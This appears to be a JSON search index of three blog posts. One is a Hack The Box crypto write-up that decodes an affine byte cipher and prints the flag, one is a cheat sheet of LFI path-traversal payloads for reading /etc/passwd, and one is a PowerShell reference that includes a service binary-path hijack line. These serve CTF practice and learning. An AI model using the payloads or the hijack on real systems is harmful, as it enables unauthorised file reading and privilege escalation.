[{"content":"Scenario \u0026ldquo;You are after an organised crime group which is responsible for the illegal weapon market in your country. As a secret agent, you have infiltrated the group enough to be included in meetings with clients. During the last negotiation, you found one of the confidential messages for the customer. It contains crucial information about the delivery. Do you think you can decrypt it?\u0026rdquo; - HTB challenge\nLet\u0026rsquo;s begin We\u0026rsquo;re given two files from the zip file, msg.enc and chall.py.\nThe content of the msg.enc\nThe content of the chall.py\nIt seems like the encryption algorithm used to generate msg.enc. There we can see that MSG is imported from the \u0026ldquo;secret\u0026rdquo; which we are trying to recover. If you take a closer look into the encryption function, modulo operation is used. In other words, it is impossible to make a symmetrical decrypting equation (well, at least in my head).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import string # from secret import MSG def encryption(msg): ct = [] for char in msg: ct.append((123 * char + 18) % 256) return bytes(ct) #ct = encryption(MSG) # f = open(\u0026#39;./msg.enc\u0026#39;,\u0026#39;w\u0026#39;) # f.write(ct.hex()) # f.close() sample1 = b\u0026#39;a\u0026#39; sample2 = b\u0026#39;ab\u0026#39; ct1 = encryption(sample1) ct2 = encryption(sample2) print(ct1.hex()) print(ct2.hex()) Modified some codes to see how this works.\nThe output:\n1 2 ad # from b\u0026#39;a\u0026#39; ad28 # from b\u0026#39;ab\u0026#39; This encryption algorithm takes each bytes in the string, does some maths, and prints out in the \u0026lsquo;double digit\u0026rsquo; hex format.\n\u0026lsquo;a\u0026rsquo; -\u0026gt; \u0026lsquo;ad\u0026rsquo;,\n\u0026lsquo;b\u0026rsquo; -\u0026gt; \u0026lsquo;28\u0026rsquo;\nWith knowing all these, one thing we can try is to map all printable characters to those encrypted hex outputs. At the end, we can split the encrypted message by chunk of two bytes and use the map to convert those back to plain text.\nExample:\nsecret = 6e0a9372ec49a3\n6e0a9372ec49a3 -\u0026gt; 6e|0a|93|72|ec|49|a3 -\u0026gt; map[\u0026lsquo;62\u0026rsquo;], map[\u0026lsquo;0a\u0026rsquo;], map[\u0026lsquo;93\u0026rsquo;], map[\u0026lsquo;72\u0026rsquo;] \u0026hellip;\nThe code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import string def createMap(msg): MAP = dict() for char in msg: enc = (123 * char + 18) % 256 ct = hex(enc)[2:].zfill(2) MAP[ct] = chr(char) return MAP S = string.printable.encode() # Assign all printable characters in byte format to variable \u0026#39;S\u0026#39; MAP = createMap(S) secret = input(\u0026#39;\\nEnter encrypted message:\\n\\n\u0026#39;) print(\u0026#39;\\n\\nRecovered message:\\n\u0026#39;) for i in range(0, len(secret), 2): ct = secret[i:i+2] print(MAP[ct], end=\u0026#39;\u0026#39;) print() Created map:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 22 -\u0026gt; 0 9d -\u0026gt; 1 18 -\u0026gt; 2 93 -\u0026gt; 3 0e -\u0026gt; 4 89 -\u0026gt; 5 04 -\u0026gt; 6 7f -\u0026gt; 7 fa -\u0026gt; 8 75 -\u0026gt; 9 ad -\u0026gt; a 28 -\u0026gt; b a3 -\u0026gt; c 1e -\u0026gt; d 99 -\u0026gt; e 14 -\u0026gt; f 8f -\u0026gt; g 0a -\u0026gt; h 85 -\u0026gt; i 00 -\u0026gt; j 7b -\u0026gt; k f6 -\u0026gt; l 71 -\u0026gt; m ec -\u0026gt; n 67 -\u0026gt; o e2 -\u0026gt; p 5d -\u0026gt; q d8 -\u0026gt; r 53 -\u0026gt; s ce -\u0026gt; t 49 -\u0026gt; u c4 -\u0026gt; v 3f -\u0026gt; w ba -\u0026gt; x 35 -\u0026gt; y b0 -\u0026gt; z 4d -\u0026gt; A c8 -\u0026gt; B 43 -\u0026gt; C be -\u0026gt; D 39 -\u0026gt; E b4 -\u0026gt; F 2f -\u0026gt; G aa -\u0026gt; H 25 -\u0026gt; I a0 -\u0026gt; J 1b -\u0026gt; K 96 -\u0026gt; L 11 -\u0026gt; M 8c -\u0026gt; N 07 -\u0026gt; O 82 -\u0026gt; P fd -\u0026gt; Q 78 -\u0026gt; R f3 -\u0026gt; S 6e -\u0026gt; T e9 -\u0026gt; U 64 -\u0026gt; V df -\u0026gt; W 5a -\u0026gt; X d5 -\u0026gt; Y 50 -\u0026gt; Z ed -\u0026gt; ! 68 -\u0026gt; \u0026#34; e3 -\u0026gt; # 5e -\u0026gt; $ d9 -\u0026gt; % 54 -\u0026gt; \u0026amp; cf -\u0026gt; \u0026#39; 4a -\u0026gt; ( c5 -\u0026gt; ) 40 -\u0026gt; * bb -\u0026gt; + 36 -\u0026gt; , b1 -\u0026gt; - 2c -\u0026gt; . a7 -\u0026gt; / f0 -\u0026gt; : 6b -\u0026gt; ; e6 -\u0026gt; \u0026lt; 61 -\u0026gt; = dc -\u0026gt; \u0026gt; 57 -\u0026gt; ? d2 -\u0026gt; @ cb -\u0026gt; [ 46 -\u0026gt; \\ c1 -\u0026gt; ] 3c -\u0026gt; ^ b7 -\u0026gt; _ 32 -\u0026gt; ` 2b -\u0026gt; { a6 -\u0026gt; | 21 -\u0026gt; } 9c -\u0026gt; ~ 72 -\u0026gt; 65 -\u0026gt; e0 -\u0026gt; 51 -\u0026gt; 5b -\u0026gt; d6 -\u0026gt; Result:\nThe nuclear will arrive on friday.\nAnd we got the flag.\nHTB{l00k_47_y0u_r3v3rs1ng_3qu4710n5_c0ngr475}\n","date":"2022-03-06T00:00:00Z","image":"https://sudo-echo-jin.github.io/p/babyencryption/bubbles_hu59f52cd2db3f02cfe123f823a5a59ac0_157699_120x120_fill_q75_box_smart1.jpg","permalink":"https://sudo-echo-jin.github.io/p/babyencryption/","title":"BabyEncryption"},{"content":"LFI 1 2 3 4 5 6 /etc/passwd ../../../../../../etc/passwd ../../../../../../etc/passwd%00 # works on php version \u0026lt;= 5.3.4 %2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd # url encode %252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd # url encode twice php://filter/convert.base64-encode/resource=PAYLOAD # wrapper ","date":"2022-03-06T00:00:00Z","image":"https://sudo-echo-jin.github.io/p/file-inclusion/bubbles_hu59f52cd2db3f02cfe123f823a5a59ac0_157699_120x120_fill_q75_box_smart1.jpg","permalink":"https://sudo-echo-jin.github.io/p/file-inclusion/","title":"LFI"},{"content":"Powershell Commands Services 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # List all running services Get-Service | ? {$_.Status -eq \u0026#34;Running\u0026#34;} | select -First 2 |fl # Handle specific service sc qc SERVICE_NAME # Query service sc start SERVICE_NAME sc stop SERVICE_NAME sc config SERVICE_NAME KEY=VALUE # ex) sc config wuauserv binPATH=C:\\Windows\\pwn.exe sc sdshow SERVICE_NAME # List running application under currently logged in user reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run # Query specific service with the registry (returns more info than sc) Get-ACL -Path HKLM:\\PATH\\TO\\SERVICE # Check Windows Defender Get-MpComputerStatus Scripts 1 2 3 4 5 6 .\\SCRIPT.ps1 # Execute script .\\SCRIPT.ps1;MODULE # Excute particular module from the script Import-Module .\\SCRIPT.ps1 # Import modules from the script Get-Module # List all loaded modules Get-ExecutionPolicy -List Set-ExecutionPolicy POLICY -Scope SCOPE # Can set policy if proper rights given. Limited to user session Windows Management Instrumentation (WMI) 1 2 3 4 5 # The command \u0026#34;wmic\u0026#34; is suited for CMD where as Powershell utilizes \u0026#34;Get-WmiObject\u0026#34; and \u0026#34;Invoke-WmiMethod wmic # Used in CMD Get-WmiObject # Get instances or information of WMI classes Get-WmiObject win32_useraccount # List user accounts with sid Invoke-WmiMethod # Get methods of WMI objects ","date":"2022-03-06T00:00:00Z","image":"https://sudo-echo-jin.github.io/p/windows-resource/bubbles_hu59f52cd2db3f02cfe123f823a5a59ac0_157699_120x120_fill_q75_box_smart1.jpg","permalink":"https://sudo-echo-jin.github.io/p/windows-resource/","title":"Windows Basic"}]